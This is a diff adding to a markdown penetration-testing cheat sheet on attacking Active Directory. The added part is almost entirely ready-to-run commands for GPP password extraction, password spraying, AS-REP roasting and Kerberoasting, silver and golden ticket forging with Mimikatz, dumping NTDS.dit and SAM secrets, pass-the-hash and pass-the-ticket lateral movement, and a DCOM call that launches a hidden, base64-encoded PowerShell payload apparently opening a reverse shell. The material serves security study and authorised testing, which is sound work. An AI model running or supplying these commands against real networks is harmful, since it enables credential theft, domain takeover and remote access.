@@ -1,4 +1,4 @@
-## Section 1 Active Directory Introduction
+p## Section 1 Active Directory Introduction
 - Don't ignore when you get access to another low-privileged user
 	- Just begin the enumeration again because they may have different access
 ## Section 2 Manual Enumeration
@@ -339,4 +339,229 @@ Get-GPPPassword.py -hashes:'NTHASH' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLE
 - Parse a local file
 ```
 Get-GPPPassword.py -xmlfile '/path/to/policy.xml' 'LOCAL'
+```
+- If it's an SMB share =If SYSVOL share or any share which domain name as folder name do the following:
+```
+#Download the whole share
+https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
+#Navigate to the downloaded folder
+grep -inr "cpassword"
+```
+- Crackmapexec
+```
+crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+```
+```
+crackmapexec smb <TARGET[s]> -u <USERNAME> -H <LMHASH:NTLM:HASH> -d <DOMAIN> -m gpp_password
+```
+- Decrypting the CPassword
+```
+gpp-decrypt "cpassword"
+```
+## Password Spraying
+### Crackmapexec
+```
+crackmapexec smb <IP> -u <USERS.TXT> -p 'pass' -d <DOMAIN> --continue-on-success
+```
+### Kerbrute
+```
+kerbrute passwordspray -d <DOMAIN> .\usernames.txt "pass"
+```
+## AS-REP Roasting
+- Get hash of AS-REP roastable accounts from kali
+```
+impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
+```
+- Get from compromised windows host
+```
+.\Rubeus.exe asreproast /nowrap
+```
+- Crack the hashes
+```
+hashcat -m 18200 hashes.txt wordlist.txt --force
+```
+## Kerberoasting
+- Dumping from compromised windows host and saving with a custom name
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+- Impacket from kali machine
+```
+impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
+```
+- Cracking the passwords
+```
+hashcat -m 13100 hashes.txt wordlist.txt --force
+```
+## Silver Tickets
+- Obtaining the hash of an SPN user using Mimikatz
+```
+privilege::debug
+```
+```
+#Get NTLM hash of the SPN account here
+sekurlsa::logonpasswords
+```
+- Getting Domain SID
+```
+whoami /user
+```
+```
+#this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
+```
+- Forging silver ticket ft Mimikatz
+```
+kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGETSYSTEM.DOMAIN> /service:<SERVICE_NAME> /rc4:<NTLM_HASH> /user:<NEW_USER>
+```
+```
+exit
+```
+```
+#Check tickets with 
+klist
+```
+- Accessing service
+```
+iwr -UseDefaultCredentials <SERVICENAME>://<COMPUTERNAME>
+```
+## Secretsdump
+```
+secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+```
+- For local user
+```
+secretsdump.py <USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
+```
+- For domain user
+```
+secretsdump.py <DOMAIN>/<USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
+```
+## Dumping NTDS.dit
+- Use -just-dc-ntlm option with any of the secretsdump commands to dump ntds.dit
+```
+secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -just-dc-ntlm
+```
+## Lateral Movement
+### PSExec SMBExec WMIExec AtEXEC
+```
+psexec.py <domain>/<user>:<password1>@<IP>
+# the user should have write access to Admin share then only we can get sesssion
+
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+smbexec.py <domain>/<user>:<password1>@<IP>
+
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+wmiexec.py <domain>/<user>:<password1>@<IP>
+
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+#we passed full hash here
+
+atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
+#we passed full hash here
+```
+### Winrs
+- Run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
+	- run this on windows session
+```
+winrs -r:<COMPUTERNAME> -u:<USERNAME> -p:<PASSWORD> "<COMMAND>"
+```
+### Crackmapexec
+```
+crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
+crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
+crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
+crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
+
+#Try --local-auth option if nothing comes up
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
+crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
+crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command
+
+#Pass the hash
+crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
+#We can run all the above commands with hash and obtain more information
+
+#crackmapexec modules
+crackmapexec smb -L #listing modules
+crackmapexec smb -M mimikatx --options #shows the required options for the module
+crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
+crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
+```
+### Pass the ticket
+```
+.\mimikatz.exe
+```
+```
+sekurlsa::tickets /export
+```
+```
+kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
+```
+```
+klist
+```
+```
+dir \\<RHOST>\admin$
+```
+### DCOM
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+### Golden Ticket
+- Get the krbtgt hash
+```
+.\mimikatz.exe
+```
+```
+privilege::debug
+```
+```
+lsadump::lsa /inject /name:krbtgt
+```
+```
+lsadump::lsa /patch
+```
+```
+lsadump::dcsync /user:krbtgt
+```
+- Remove any existing tickets
+```
+kerberos::purge
+```
+- Sample Command
+```
+kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden
+```
+- Obtaining Access
+```
+mimikatz.exe #No need for hightest privileges
+```
+```
+kerberos::ptt golden
+```
+```
+misc::cmd
+```
+### Shadow Copies
+```
+vshadow.exe -nw -p C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
